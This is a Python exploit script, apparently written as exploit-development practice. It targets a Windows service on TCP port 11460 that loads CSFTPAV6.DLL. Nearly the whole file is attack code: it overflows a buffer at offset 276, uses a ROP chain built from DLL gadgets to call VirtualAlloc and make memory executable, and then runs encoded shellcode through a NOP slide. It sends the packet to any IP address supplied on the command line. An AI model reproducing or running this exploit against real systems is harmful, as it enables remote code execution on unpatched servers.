import socket
import sys
from struct import pack
from pwn import p32


# badchars = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]
# narly !nmod results = CSFTPAV6.DLL
# 5054a220  749938c0 KERNEL32!VirtualAllocStub => x20 badchar

# Build sample stack for VirtualAllocStub
functionAddress = b"AAAA"       # VirtualAllocStub address
shellcodeAddress = b"BBBB"      # shellcode address
param1 = b"CCCC"                # lpAddress = shellcode address
param2 = b"DDDD"                # dwSize
param3 = b"EEEE"                # flAllocationType
param4 = b"FFFF"                # flProtect

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)    # opcode
buf += pack("<i", 0x0)      # 1st memcpy: offset
buf += pack("<i", 0x500)    # 1st memcpy: size field
buf += pack("<i", 0x0)      # 2nd memcpy: offset
buf += pack("<i", 0x100)    # 2nd memcpy: size field
buf += pack("<i", 0x0)      # 3rd memcpy: offset
buf += pack("<i", 0x100)    # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

#-------------------------------------- Build ROP -----------------------------------------

# Save esp to esi (esi = stack at this point). USE AS BREAKPOINT
eip = p32(0x50501110)       # push esp ; push eax ; pop edi ; pop esi ; ret

# Move the EIP back         # EIP is offset by 28 bytes to the front
rop1 = p32(0x5050118e)      # mov eax, esi ; pop esi ; ret  ;
push1 = b"AAAA"             # makeup for 1 pop
rop2 = p32(0x505115a3)      # pop ecx ; ret  ;
value1 = p32(0xffffffe4)    # -0x1c (28 bytes back)
rop3 = p32(0x5051579a)      # add eax, ecx ; ret  ;
rop4 = p32(0x5050118d)      # push eax ; mov eax, esi ; pop esi ; ret  ;   correct esp in esi

# Set VirtualAllocStub address 
rop5 = p32(0x5053a0f5)      # pop eax ; ret  ;
value2 = p32(0x5054a221)    # VirtualAllocStub address in IAT + 1
rop6 = p32(0x505115a3)      # pop ecx ; ret  ; 
value3 = p32(0xffffffff)    # -1
rop7 = p32(0x5051579a)      # add eax, ecx ; ret  ;
rop8 = p32(0x5051f278)      # mov eax, dword [eax] ; ret  ;     save address value in IAT
rop9 = p32(0x5051cbb6)      # mov dword [esi], eax ; ret  ;     save actual address of VA

# Move sample stack down 4 bytes
rop10 = rop11 = rop12 = rop13 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret  ;

# Set shellcode address     # Set breakpoint here to check for length
rop14 = p32(0x5050118e)     # mov eax, esi ; pop esi ; ret  ;
push2 = b"AAAA"             # makeup for 1 pop      current esi value is b"AAAA", lost address
rop15 = p32(0x5052f773)     # push eax ; pop esi ; ret  ;   restore correct value for esi
rop16 = p32(0x505115a3)     # pop ecx ; ret  ;
value4 = p32(0xfffffe0e)    # payload legnth      => FIX LATER (EQUALS THE LENGTH OF ROP)
rop17 = p32(0x50533bea)     # sub eax, ecx ; ret ;
rop18 = p32(0x5051cbb6)     # mov dword [esi], eax ; ret  ;    save shellcode address  

# Set param1 address
#rop19 = p32(0x5050118e)     # mov eax, esi ; pop esi ; ret  ;
#push3 = b"AAAA"             # makeup for 1 pop      current esi value is b"AAAA", lost address
#rop20 = p32(0x5052f773)     # push eax ; pop esi ; ret  ;   restore correct value for esi
# Move sample stack down 4 bytes
rop21 = rop22 = rop23 = rop24 = p32(0x50524385)  # inc esi ; sub byte [ebx], bh ; ret  ;
# Set param1 address (cont.)
rop25 = p32(0x5051cbb6)      # mov dword [esi], eax ; ret  ;    save shellcode address

# Move sample stack down 4 bytes
rop26 = rop27 = rop28 = rop29 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret  ;

# Set param2 address
rop30 = p32(0x50503821)     # xor eax, eax ; ret  ;            get 0
rop31 = p32(0x505115a3)     # pop ecx ; ret  ;
value5 = p32(0xffffffff)    # -1
rop32 = p32(0x50533bf4)     # sub eax, ecx ; ret  ;
rop33 = p32(0x5051cbb6)     # mov dword [esi], eax ; ret  ;    save size

# Move sample stack down 4 bytes
rop34 = rop35 = rop36 = rop37 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret  ;

# Set param3 address
rop38 = p32(0x50503821)     # xor eax, eax ; ret  ;            get 0
rop39 = p32(0x505115a3)     # pop ecx ; ret  ;
value6 = p32(0xffffefff)    # -0x00001001
rop40 = p32(0x505311c7)     # inc ecx ; ret  ; 
rop41 = p32(0x50533bf4)     # sub eax, ecx ; ret  ;
rop42 = p32(0x5051cbb6)     # mov dword [esi], eax ; ret  ;   save 1000 MEM_COMMIT

# Move sample stack down 4 bytes
rop43 = rop44 = rop45 = rop46 = p32(0x50522fa7) # inc esi ; add al, 0x2B ; ret  ;

# Set param4 address
rop47 = p32(0x50503821)     # xor eax, eax ; ret  ;            get 0
rop48 = p32(0x505115a3)     # pop ecx ; ret  ;
value7 = p32(0xffffffc0)    # -0x40
rop49 = p32(0x50533bf4)     # sub eax, ecx ; ret  ;
rop50 = p32(0x5051cbb6)     # mov dword [esi], eax ; ret  ;   save PAGE_EXECUTE_READWRITE

# Move sample stack back to front of eip and restore esp = esi 
rop51 = p32(0x5050118e)     # mov eax, esi ; pop esi ; ret  ;
push4 = b"AAAA"             # makeup for 1 pop      current esi byte is b"AAAA", lost address
rop52 = p32(0x505115a3)     # pop ecx ; ret  ;
rop53 = p32(0xffffffe8)     # -0x18     length of increase on sample stack + 4 bytes due to RET
rop54 = p32(0x5051579a)     # add eax, ecx ; ret  ;
rop55 = p32(0x5051571f)     # xchg eax, ebp ; ret  ;
rop56 = p32(0x50533cbf)     # mov esp, ebp ; pop ebp ; ret  ;

#--------------------------------------------------------------------------------------------

ROP = rop1 + push1 + rop2 + value1 + rop3 + rop4 + rop5 + value2 + rop6 + value3 + rop7 + rop8 + rop9 + rop10 + rop11 + rop12 + rop13 + rop14 + push2 + rop15 + rop16 + value4 + rop17 + rop18 + rop21 + rop22 + rop23 + rop24 + rop25 + rop26 + rop27 + rop28 + rop29 + rop30 + rop31 + value5 + rop32 + rop33 + rop34 + rop35 + rop36 + rop37 + rop38 + rop39 + value6 + rop40 + rop41 + rop42 + rop43 + rop44 + rop45 + rop46 + rop47 + rop48 + value7 + rop49 + rop50 + rop51 + push4 + rop52 + rop53 + rop54 + rop55 + rop56

# Unique pattern => Offset = 276
stack = functionAddress + shellcodeAddress + param1 + param2 + param3 + param4

filler = b"\x90" * (276 - len(stack))      # Ensure that the filler does not get too long
NOP_slide = b"\x90"*224
#shellcode = b"\xcc"*0x100

shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += b"\x81\x76\x0e\xf9\xb5\x83\xba\x83\xee\xfc\xe2\xf4"
shellcode += b"\x05\x5d\x01\xba\xf9\xb5\xe3\x33\x1c\x84\x43\xde"
shellcode += b"\x72\xe5\xb3\x31\xab\xb9\x08\xe8\xed\x3e\xf1\x92"
shellcode += b"\xf6\x02\xc9\x9c\xc8\x4a\x2f\x86\x98\xc9\x81\x96"
shellcode += b"\xd9\x74\x4c\xb7\xf8\x72\x61\x48\xab\xe2\x08\xe8"
shellcode += b"\xe9\x3e\xc9\x86\x72\xf9\x92\xc2\x1a\xfd\x82\x6b"
shellcode += b"\xa8\x3e\xda\x9a\xf8\x66\x08\xf3\xe1\x56\xb9\xf3"
shellcode += b"\x72\x81\x08\xbb\x2f\x84\x7c\x16\x38\x7a\x8e\xbb"
shellcode += b"\x3e\x8d\x63\xcf\x0f\xb6\xfe\x42\xc2\xc8\xa7\xcf"
shellcode += b"\x1d\xed\x08\xe2\xdd\xb4\x50\xdc\x72\xb9\xc8\x31"
shellcode += b"\xa1\xa9\x82\x69\x72\xb1\x08\xbb\x29\x3c\xc7\x9e"
shellcode += b"\xdd\xee\xd8\xdb\xa0\xef\xd2\x45\x19\xea\xdc\xe0"
shellcode += b"\x72\xa7\x68\x37\xa4\xdd\xb0\x88\xf9\xb5\xeb\xcd"
shellcode += b"\x8a\x87\xdc\xee\x91\xf9\xf4\x9c\xfe\x4a\x56\x02"
shellcode += b"\x69\xb4\x83\xba\xd0\x71\xd7\xea\x91\x9c\x03\xd1"
shellcode += b"\xf9\x4a\x56\xea\xa9\xe5\xd3\xfa\xa9\xf5\xd3\xd2"
shellcode += b"\x13\xba\x5c\x5a\x06\x60\x14\xd0\xfc\xdd\x43\x12"
shellcode += b"\xd4\x5e\xeb\xb8\xf9\xa5\x74\x33\x1f\xdf\x93\xec"
shellcode += b"\xae\xdd\x1a\x1f\x8d\xd4\x7c\x6f\x7c\x75\xf7\xb6"
shellcode += b"\x06\xfb\x8b\xcf\x15\xdd\x73\x0f\x5b\xe3\x7c\x6f"
shellcode += b"\x91\xd6\xee\xde\xf9\x3c\x60\xed\xae\xe2\xb2\x4c"
shellcode += b"\x93\xa7\xda\xec\x1b\x48\xe5\x7d\xbd\x91\xbf\xbb"
shellcode += b"\xf8\x38\xc7\x9e\xe9\x73\x83\xfe\xad\xe5\xd5\xec"
shellcode += b"\xaf\xf3\xd5\xf4\xaf\xe3\xd0\xec\x91\xcc\x4f\x85"
shellcode += b"\x7f\x4a\x56\x33\x19\xfb\xd5\xfc\x06\x85\xeb\xb2"
shellcode += b"\x7e\xa8\xe3\x45\x2c\x0e\x73\x0f\x5b\xe3\xeb\x1c"
shellcode += b"\x6c\x08\x1e\x45\x2c\x89\x85\xc6\xf3\x35\x78\x5a"
shellcode += b"\x8c\xb0\x38\xfd\xea\xc7\xec\xd0\xf9\xe6\x7c\x6f"

# Construct payload
file = filler + stack + eip + ROP + NOP_slide + shellcode

# psCommandBuffer
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" %(file,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf



def main():
    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)
        
        
    server = sys.argv[1]
    port = 11460
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    
    s.send(buf)
    s.close()
    
    print("[+] Packet sent")
    sys.exit(0)
    
    
if __name__ == "__main__":
    main()